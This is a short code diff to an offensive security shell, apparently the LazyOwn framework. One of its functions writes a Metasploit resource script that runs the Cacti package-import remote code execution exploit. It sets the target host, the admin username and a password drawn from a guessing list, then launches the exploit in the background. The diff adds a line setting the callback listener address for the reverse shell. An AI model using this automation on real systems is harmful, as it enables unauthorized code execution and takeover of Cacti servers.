@@ -7975,6 +7975,7 @@ class LazyOwnShell(Cmd):
         def cacti_exploit(config_file, host):
             config_file.write('use exploit/multi/http/cacti_package_import_rce\n')
             config_file.write(f'set RHOST {host}\n')
+            config_file.write(f'set LHOST {lhost}\n')            
             config_file.write('set USERNAME admin\n')
             config_file.write(f'set PASSWORD {line}\n')
             config_file.write('exploit -j -z\n')
